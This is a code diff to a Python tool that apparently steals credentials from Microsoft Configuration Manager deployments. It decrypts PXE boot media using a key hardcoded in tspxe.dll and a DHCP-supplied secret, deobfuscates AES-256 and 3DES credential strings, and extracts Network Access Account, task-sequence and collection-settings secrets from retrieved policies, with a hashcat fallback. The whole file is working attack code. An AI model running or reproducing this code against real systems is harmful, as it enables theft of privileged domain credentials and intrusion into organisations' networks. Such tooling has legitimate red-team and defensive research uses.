@@ -217,72 +217,93 @@ def decrypt_policy_file(path, password):
         print_nice(f"Password provided: {password}", "INFO")
 
 def deobfuscate_credential_string(credential_string):
-    #print(credential_string)
+    # Algorithm marker is embedded in the credential string structure: 1066 = AES-256,
+    # 0366 = 3DES. Newer MECM emits AES-256 here; older releases used 3DES.
+    algo_bytes = credential_string[112:116]
+    if algo_bytes == "1066":
+        algo = "aes256"
+    elif algo_bytes == "0366":
+        algo = "3des"
+    else:
+        return None
+
     key_data = binascii.unhexlify(credential_string[8:88])
     encrypted_data = binascii.unhexlify(credential_string[128:])
+    key = media_crypto.aes_des_key_derivation(key_data)
 
-    media_decryption = media_crypto.media_decryption(media_data=encrypted_data)
-    # I am unsure why this is hardset to 3DES, but I am just keeping it as that for now
-    media_decryption.set_encryption_type('CALG_3DES')
-    return media_decryption.decrypt_media_file(key_data)
-
-    #key = media_crypto.aes_des_key_derivation(key_data)
-    #last_16 = math.floor(len(encrypted_data)/8)*8
-    #return media_crypto._3des_decrypt(encrypted_data[:last_16],key[:24])
+    if algo == "3des":
+        last = math.floor(len(encrypted_data) / 8) * 8
+        return media_crypto._3des_decrypt(encrypted_data[:last], key[:24])
+    else:
+        last = math.floor(len(encrypted_data) / 16) * 16
+        return media_crypto.aes256_decrypt(encrypted_data[:last], key[:32])
 
 def decrypt_pxe_media_from_encrypted_key(encrypted_key, media_file_path):
     #ProxyDHCP Option 243
     length = encrypted_key[0]
 
-    # Pull out 48 bytes that relate to the encrypted bytes in the DHCP response
+    # Pull out the encrypted bytes from the DHCP response
     encrypted_bytes = encrypted_key[1:1+length]
-    
+
     # Isolate encrypted data bytes
-    encrypted_bytes = encrypted_bytes[20:-12] 
+    encrypted_bytes = encrypted_bytes[20:-12]
 
     # Harcoded in tspxe.dll
-    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' 
+    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9'
 
-    media_decryption = media_crypto.media_decryption(media_data=encrypted_bytes)
-    media_decryption.set_encryption_type('CALG_AES_128')
-    var_file_key = media_decryption.decrypt_media_file(key_data, decode=False)
-    # 10 byte output
-    var_file_key = var_file_key[:10]
+    # The DHCP-wrapped key carries no algorithm identifier. Newer MECM builds use AES-256
+    # while older ones use AES-128, so try both and keep whichever derived key actually
+    # decrypts the media variables file.
+    for algorithm in ('CALG_AES_256', 'CALG_AES_128'):
+        media_decryption = media_crypto.media_decryption(media_data=encrypted_bytes)
+        media_decryption.set_encryption_type(algorithm)
+        success, var_file_key = media_decryption.decrypt_media_file(key_data, decode=False)
+        if not success or var_file_key is None or len(var_file_key) < 10:
+            continue
 
-    # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
-    #var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) 
+        # 10 byte output
+        var_file_key = var_file_key[:10]
 
-    # Perform bit extension to help with key
-    LEADING_BIT_MASK =  b'\x80'
-    new_key = bytearray()
-    for byte in struct.unpack('10c',var_file_key):
-        if (LEADING_BIT_MASK[0] & byte[0]) == 128:
-            new_key = new_key + byte + b'\xFF'
-        else:
-            new_key = new_key + byte + b'\x00'
-    
-    media_variables = decrypt_media_file(media_file_path, new_key)
-    return media_variables
+        # Perform bit extension on the 10-byte secret to produce the 20-byte password used
+        # to derive the variables file key (each source byte is followed by 0xFF if its top
+        # bit is set, otherwise 0x00).
+        LEADING_BIT_MASK = b'\x80'
+        new_key = bytearray()
+        for byte in struct.unpack('10c', var_file_key):
+            if (LEADING_BIT_MASK[0] & byte[0]) == 128:
+                new_key = new_key + byte + b'\xFF'
+            else:
+                new_key = new_key + byte + b'\x00'
+
+        response, candidate = decrypt_file(media_file_path, bytes(new_key))
+        if response:
+            if VERBOSE:
+                print_nice(f"DHCP-wrapped key algorithm: {algorithm}", "INFO")
+            return candidate
+
+    print_nice("Failed to decrypt media variables file using DHCP-supplied key", "ERROR")
+    generate_hashcat_output(media_file_path)
+    return None
 
 ## File I/O Functions
 ## ------------------
 def write_to_file(path, filename, contents, type="xml"):
-    #print(path)
-    #print(filename)
-    #print((f"Writing file to {os.path.join(path, filename)}", "INFO"))
     # Check for file path existence
     if not os.path.exists(path):
         os.makedirs(path)
-    if type == "xml":
-        filename = filename + ".xml"
-        f = open(os.path.join(path, filename), "w")
-    elif type == "binary":
-        f = open(os.path.join(path, filename), "wb")
+    if type == "binary":
+        full_path = os.path.join(path, filename)
+    elif type == "xml":
+        full_path = os.path.join(path, filename + ".xml")
     else:
-        filename = filename + "." + type
-        f = open(os.path.join(path, filename), "w")
-    f.write(contents)
-    f.close()
+        full_path = os.path.join(path, filename + "." + type)
+
+    # Pick text vs binary mode from the actual payload type so callers can pass either
+    # str or bytes regardless of the file extension they asked for.
+    is_bytes = isinstance(contents, (bytes, bytearray, memoryview))
+    mode = "wb" if is_bytes else "w"
+    with open(full_path, mode) as f:
+        f.write(contents)
 
 def copy_file_to_dir(file_path:str, target_dir:str, delete_original:bool = False):
     if not os.path.exists(target_dir):
@@ -775,7 +796,7 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClien
                     print_nice(f"Requesting {category} from: {url}", "INFO")
 
                 content = session.get(url, headers=headers)
-                write_to_file(policy_folder, category, content.content, "xml")
+                write_to_file(policy_folder, category + ".xml", content.content, "binary")
 
 
     # Make requests for all relevant policies
@@ -833,8 +854,9 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClien
 
             wf_dstr = decrypt_http_cert_response_data(key, colsetting, data)
 
-            # Decrypt and Decompress the data
-            root = ET.fromstring(wf_dstr)
+            # Decrypt and Decompress the data. Use the lenient parser because the decrypted
+            # collection settings response can carry trailing CBC padding past the first root.
+            root = _parse_policy_xml(wf_dstr)
             dstr = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
             out = "".join(c for c in dstr if c.isprintable()) 
             colsettings_decrypted.append(out)
@@ -844,6 +866,13 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClien
 
 ## Parsing
 ## ------------------
+def _parse_policy_xml(xml_string):
+    # MECM policy bodies can have trailing content past the first root (Hash blocks,
+    # padding, or extra siblings). lxml's recover mode parses up to the first usable
+    # root and ignores the rest instead of raising "Extra content at the end".
+    parser = ET.XMLParser(recover=True)
+    return ET.fromstring(xml_string, parser=parser)
+
 class credential_processing_result:
     def __init__(self):
         self.naa_xml = None
@@ -876,7 +905,7 @@ class credential_processing_result:
     def _process_naa_xml(self):
         if (VERBOSE):
             print_nice("Extracting Network Access Accounts", "INFO")
-        root = ET.fromstring(self.naa_xml[:self.naa_xml.rfind('>')+1])
+        root = _parse_policy_xml(self.naa_xml)
         network_access_account_xml = root.xpath("//*[@class='CCM_NetworkAccessAccount']")
 
         # Add a catch for if there are no NAAs
@@ -897,7 +926,7 @@ class credential_processing_result:
 
     # Task Sequences
     def _decrypt_task_sequence_xml(self, ts_xml):
-        root = ET.fromstring(ts_xml[:ts_xml.rfind('>')+1])
+        root = _parse_policy_xml(ts_xml)
 
         # Find all pkgnames
         ts_sequences = root.xpath("//*[@name='TS_Sequence']/value")
@@ -943,7 +972,7 @@ class credential_processing_result:
             property="CapturePassword" name="OSDCaptureAccountPassword", 
             property="CaptureUsername" name="OSDCaptureAccount"
         """
-        tree = ET.fromstring(ts_xml).getroottree()
+        tree = _parse_policy_xml(ts_xml).getroottree()
 
         # Keywords to search through for potential credentials
         keyword_list = ["password", "account", "username"]
@@ -980,12 +1009,12 @@ class credential_processing_result:
                         for el in par.xpath('//*[contains(translate(@name,"ABCDEFGHIJKLMNOPQRSTUVWXYZ","abcdefghijklmnopqrstuvwxyz"),"' + unique_word + '")]'):
                             # Duplicate tags that match more than one keyword
                             if el != element:
-                                self.ts_credentials_found.append((task_sequence_step, el.attrib["name"], el.text))
+                                self.ts_credentials.append((task_sequence_step, el.attrib["name"], el.text))
                                 # Debug
                                 print(el.attrib["name"] + " - " + el.text)
                     # Debug
                     print(element.attrib["name"] + " - " + str(element.text))
-                    self.ts_credentials_found.append((task_sequence_step, element.attrib["name"], element.text))
+                    self.ts_credentials.append((task_sequence_step, element.attrib["name"], element.text))
 
         if not creds_found:
             # Print no credentials found in task sequence
@@ -997,7 +1026,7 @@ class credential_processing_result:
         if (VERBOSE):
             print_nice("Extracting Collection Settings Secrets", "INFO")
             
-        root = ET.fromstring(self.collection_settings_xml)
+        root = _parse_policy_xml(self.collection_settings_xml)
         instances = root.find("PolicyRule").find("PolicyAction").findall("instance")
 
         for instance in instances:
@@ -1022,7 +1051,7 @@ class credential_processing_result:
         console.print(table)
 
     def _print_ts_credentials_table(self):
-        for cred in self.ts_credentials_found:
+        for cred in self.ts_credentials:
             ts_step = cred[0]
             value_name = cred[1]
             value_value = cred[2]
